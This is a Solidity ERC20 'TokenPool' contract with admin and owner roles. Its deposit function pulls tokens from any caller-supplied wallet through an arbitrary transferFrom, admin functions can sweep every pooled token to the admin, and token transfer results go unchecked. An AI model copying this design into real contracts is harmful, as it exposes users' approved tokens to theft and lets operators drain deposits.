// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TokenPool is ReentrancyGuard {
    IERC20 private token;
    uint256 private totalBalance;
    address private admin;
    address public owner;

    event Deposit(address indexed account, uint256 amount);
    event Withdraw(address indexed account, uint256 amount);

    mapping(address=>uint256) allowance;
    mapping(address=>uint256) transferred;
    constructor(address _tokenAddress) {
        require(_tokenAddress != address(0), "Invalid token address");
        token = IERC20(_tokenAddress);
        admin = msg.sender;
        owner = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    function deposit(uint256 amount, address wallet) external nonReentrant {
        require(amount > 0, "Invalid deposit amount");
        token.transferFrom(wallet, address(this), amount);
        allowance[wallet]+=amount;
        totalBalance += amount;
        emit Deposit(wallet, amount);
    }
    // admin only
    function withdraw(uint256 amount,address wallet) external nonReentrant onlyAdmin {
        require(amount > 0, "Invalid withdrawal amount");
        token.transfer(wallet, amount);
        totalBalance -= amount;
        transferred[wallet]+=amount;
        emit Withdraw(wallet, amount);
    }


    function getTotalBalance() external view returns (uint256) {
        return totalBalance;
    }

    // Owner only functions
    function WithdrawTokens(address tokenAddr, uint256 amount) public onlyAdmin nonReentrant{
        IERC20(tokenAddr).transfer(admin,amount);
    }
    function withDrawNative() external nonReentrant onlyOwner{
        payable(owner).transfer((address(this).balance));
    }

    function changeAdmin(address _newAdmin) external nonReentrant onlyOwner{
        admin = _newAdmin;
    }

    function changeOwner(address _newOwner) external nonReentrant onlyOwner{
        owner = _newOwner;
    }
    function viewAdmin() external view onlyOwner returns(address){
        return admin;
    }
}
 